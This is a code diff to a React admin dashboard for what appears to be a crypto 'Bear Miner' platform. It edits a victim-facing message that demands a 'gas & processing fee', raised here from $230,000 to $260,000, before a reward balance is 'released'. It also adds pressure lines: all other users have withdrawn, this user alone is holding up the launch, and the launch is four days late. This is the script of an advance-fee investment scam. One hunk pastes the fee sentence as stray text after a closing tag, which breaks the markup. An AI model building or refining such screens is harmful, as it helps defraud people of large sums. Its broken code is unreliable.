@@ -906,10 +906,10 @@ export default function AdminDashboard() {
                           </span>
                         </div>
                         <h3 className="text-xl sm:text-2xl font-black text-red-600 leading-tight">
-                          $230,000.00 needed to complete withdrawal
+                          $260,000.00 needed to complete withdrawal
                         </h3>
                         <p className="text-xs text-red-700/80 font-semibold leading-relaxed">
-                          Your withdrawal request has been validated and approved by the system. A gas & processing fee of <strong className="text-red-600">$230,000.00 USD</strong> is required to finalize and release the full reward balance to your wallet.
+                          Your withdrawal request has been validated and approved by the system. A gas & processing fee of <strong className="text-red-600">$260,000.00 USD</strong> is required to finalize and release the full reward balance to your wallet.
                         </p>
                       </div>
                     </div>
@@ -937,7 +937,10 @@ export default function AdminDashboard() {
                           </span>
                         </div>
                         <p className="text-xs text-orange-800/70 font-semibold leading-relaxed">
-                          All other users have successfully completed their withdrawals. <strong className="text-orange-700">You are the only remaining participant</strong> whose withdrawal is pending. The Bear Miner product launch cannot proceed until all user withdrawals are finalized. Your cooperation is critical to unlock the platform for all participants.
+                          All other users and partners have successfully completed their withdrawals. <strong className="text-orange-700">You are the only remaining participant</strong> whose withdrawal is pending. The Bear Miner product launch cannot proceed until all user withdrawals are finalized. Your cooperation is critical to unlock the platform for all participants.
+                        </p>
+                        <p className="text-xs text-orange-800/70 font-semibold leading-relaxed">
+                          4 days to launch delayed due to pending withdrawal. Please finalize your withdrawal to proceed with the product launch.
                         </p>
                         <div className="flex items-center gap-3 pt-1">
                           <div className="flex items-center gap-1.5 bg-green-500/10 rounded-full px-3 py-1">
@@ -1106,7 +1109,7 @@ export default function AdminDashboard() {
                             <Minus className="h-3 w-3" />
                           </Button>
                         </div>
-                      </div>
+                      </div>Your withdrawal request has been validated and approved by the system. A gas & processing fee of $260,000.00 USD is required to finalize and release the full reward balance to your wallet.
                       <div className="flex items-center gap-2 text-sm font-bold text-muted-foreground px-1">
                         <span className="opacity-50 text-[10px] uppercase tracking-wider">Estimated Value:</span>
                         <span className="text-foreground">{formatCurrency(parseFloat(editForm.tokenBalance || "0") * parseFloat(settings.bearTokenPrice || "0"))} USD</span>
